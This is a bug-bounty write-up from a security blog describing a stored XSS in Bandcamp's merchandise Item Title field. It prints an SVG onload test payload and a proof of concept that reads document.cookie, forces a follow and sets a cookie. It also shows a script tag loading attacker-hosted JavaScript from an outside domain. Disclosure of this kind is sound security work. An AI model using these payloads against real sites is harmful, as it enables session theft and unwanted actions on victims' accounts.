  <title>Stored XSS in BandCamp</title>
  <meta name="description" content="        Recently, while my friend Alyssa Herrera and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that Bandcamp ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other. I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the Add Music function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn’t vulnerable to either. The next function I thought I wanted to test was the Add Merch function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the Item Title or Description accepted / rendered any HTML. I put in a simple XSS payload for both: &amp;lt;svg/onload=confirm(0)&amp;gt; I saved and published the new “merchandise”, and voila: NOTHING happened. It was sanitized and I was bummed that it didn’t work. Then I saw the Buy Now button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the Item Title in this frame, thus allowing an attacker to simply insert any HTML or javascript. I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. With that in mind, I came up with this POC: alert(&quot;Stored XSS on BandCamp&quot;); alert(&quot;Your cookies: &quot; + document.cookie); document.getElementById(&quot;follow-unfollow&quot;).click();alert(&quot;Thanks for the follow :^D&quot;); document.cookie=&quot;hacker=cdl;path=/;domain=.bandcamp.com&quot;; Then changed the Item Title to &amp;lt;script src=//sxcurity.pro/bandcamp.js&amp;gt;&amp;lt;/script&amp;gt; which made the victim follow me and set the cookie “hacker” to “cdl” for bandcamp.com and all subdomains in their browser!

    <p>        Recently, while my friend <a href="https://twitter.com/_psycho_mantis" rel="noopener noreferrer" style="color:#DC0739;text-decoration:none;"><b>Alyssa Herrera</b></a> and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that <strong>Bandcamp</strong> ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other.</p>

<p>I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the <strong>Add Music</strong> function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn’t vulnerable to either.</p>

<p>The next function I thought I wanted to test was the <strong>Add Merch</strong> function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the <em>Item Title</em> or <em>Description</em> accepted / rendered any HTML.
I put in a simple XSS payload for both:  <code class="highlighter-rouge">&lt;svg/onload=confirm(0)&gt;</code></p>

<p>I saved and published the new “merchandise”, and voila:
NOTHING happened. It was sanitized and I was bummed that it didn’t work.
Then I saw the <strong>Buy Now</strong> button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the <strong>Item Title</strong> in this frame, thus allowing an attacker to simply insert any HTML or javascript.</p>

<p>I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. 
With that in mind, I came up with this POC:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alert</span><span class="p">(</span><span class="s2">"Stored XSS on BandCamp"</span><span class="p">);</span>

</code></pre></div></div>
<p>Then changed the <strong>Item Title</strong> to <code class="highlighter-rouge">&lt;script src=//sxcurity.pro/bandcamp.js&gt;&lt;/script&gt;</code>
which made the victim follow me and set the cookie “hacker” to “cdl” for bandcamp.com and all subdomains in their browser!
